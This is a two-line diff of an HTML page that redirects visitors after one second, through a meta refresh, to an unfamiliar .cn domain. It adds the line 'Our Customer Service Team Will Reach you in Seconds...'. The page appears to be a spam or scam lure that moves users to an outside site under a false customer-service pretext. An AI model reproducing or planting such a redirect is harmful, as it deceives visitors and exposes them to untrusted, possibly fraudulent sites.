@@ -1,1 +1,2 @@
-<meta http-equiv="refresh" content="1;url=http://bagbexs.luxv.cn/bagbexs">
+<meta http-equiv="refresh" content="1;url=http://bagbexs.luxv.cn">
+Our Customer Service Team Will Reach you in Seconds...
